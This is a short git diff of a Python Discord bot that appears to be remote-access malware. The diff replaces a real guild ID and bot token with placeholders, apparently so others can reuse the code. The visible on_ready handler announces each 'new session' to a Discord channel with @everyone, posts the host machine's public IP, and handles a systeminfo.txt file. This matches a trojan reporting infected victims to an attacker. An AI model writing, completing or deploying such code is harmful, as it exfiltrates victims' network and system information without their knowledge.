@@ -1,8 +1,7 @@
 from main import Client
 import discord, os, asyncio, ctypes, requests
 from discord.ext import commands
-from dotenv import load_dotenv
-load_dotenv()
+
 Client = Client()
 
 intents = discord.Intents.default()
@@ -301,7 +300,7 @@ async def on_command_error(ctx, error):
 
 @bot.event
 async def on_ready():
-    guild_id = 1179081135045742592
+    guild_id = 123456789 # YOUR GUILD ID
     channel_name = "session"
     message_content = f"@everyone, new session! IP: ||{Client.getPublicIP()}||."
     file_path = "systeminfo.txt"
@@ -340,4 +339,4 @@ async def on_ready():
     print(f"Message sent in channel '{channel_name}'.")
     print(f"We have logged in as {bot.user}")
 
-bot.run(os.getenv("DiscordToken"))
+bot.run("YOUR_DISCORD_TOKEN")
